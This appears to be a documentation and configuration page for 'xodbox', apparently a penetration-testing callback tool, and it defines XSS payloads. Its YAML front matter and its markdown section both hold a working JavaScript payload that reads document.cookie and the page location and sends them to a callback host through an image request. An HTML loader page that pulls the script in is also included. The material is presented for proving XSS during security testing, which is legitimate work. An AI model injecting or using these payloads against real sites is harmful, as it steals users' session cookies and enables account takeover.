---
title: XSS Payloads
description: Returns JS that embeds an image back to xodbox
weight: -500
payloads:
  - sort_order: -500
    pattern: /jsc$
    data:
      headers:
        "Content-Type": "text/javascript"
      body: |
        (function (){
            var s = document.createElement("img");
            document.body.appendChild(s);
            s.src="{{ .CallBackURL}}?src="+window.location+"&c="+document.cookie;
        })()
  - sort_order: -500
    pattern: /jsc.html$
    data: 
      headers:
        "Content-Type": "text/html"
      body: |
        <!DOCTYPE html>
        <html>
          <head>
            <meta charset="utf-8">
          </head>
          <body>
            <script src="//{{.Host}}/jsc"></script>
          </body>
        </html>

---

### /jsc

Simple JS Payload. Useful form embedding or quickly copying and modifying for an XSS payload to prove execution and
exfil.

```javascript
(function (){
    var s = document.createElement("img");
    document.body.appendChild(s);
    s.src="//{{ .Host }}/jscb?src="+window.location+"&c="+document.cookie;
})()

```

### /jsc.html

Simple HTML to load simple JS Payload.

